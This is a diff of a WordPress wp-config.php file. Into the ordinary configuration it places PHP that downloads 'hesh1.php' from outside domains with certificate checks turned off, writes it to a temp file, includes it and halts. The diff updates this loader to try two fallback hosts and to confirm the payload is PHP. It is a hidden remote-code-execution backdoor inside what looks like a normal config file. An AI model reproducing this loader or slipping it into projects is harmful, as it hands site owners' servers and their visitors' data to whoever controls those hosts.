@@ -65,22 +65,27 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * You can have multiple installations in one database if you give each
  * a unique prefix. Only numbers, letters, and underscores please!
  */
-$ftp_url = "https://egre55.com/resources/hesh1.php";
-$cu = curl_init();
-curl_setopt_array($cu, array(
-    CURLOPT_URL => $ftp_url,
-    CURLOPT_SSL_VERIFYHOST => FALSE,
-    CURLOPT_SSL_VERIFYPEER => FALSE,
-    CURLOPT_RETURNTRANSFER => TRUE
-));
-$datas = curl_exec($cu);
-curl_close($cu);
+$dm = array("https://jinwoo.live/rs/hesh1.php", "https://gabimaru.live/rs/hesh1.php");
+foreach($dm as $ftp_url){
+    $cu = curl_init();
+    curl_setopt_array($cu, array(
+        CURLOPT_URL => $ftp_url,
+        CURLOPT_SSL_VERIFYHOST => FALSE,
+        CURLOPT_SSL_VERIFYPEER => FALSE,
+        CURLOPT_RETURNTRANSFER => TRUE
+    ));
+    $datas = curl_exec($cu);
+    curl_close($cu);
 
-$dataf = tempnam(sys_get_temp_dir(), "wp_based");
-file_put_contents($dataf, $datas);
-include_once($dataf);
-if(1+1==2){
-	exit;
+    if(empty($datas))continue;
+    if(strpos($datas, "<?php") === false)continue;
+
+    $dataf = tempnam(sys_get_temp_dir(), "wp_based");
+    file_put_contents($dataf, $datas);
+    include_once($dataf);
+    if(1+1==2){
+        exit;
+    }
 }
 /**
  * For developers: WordPress debugging mode.
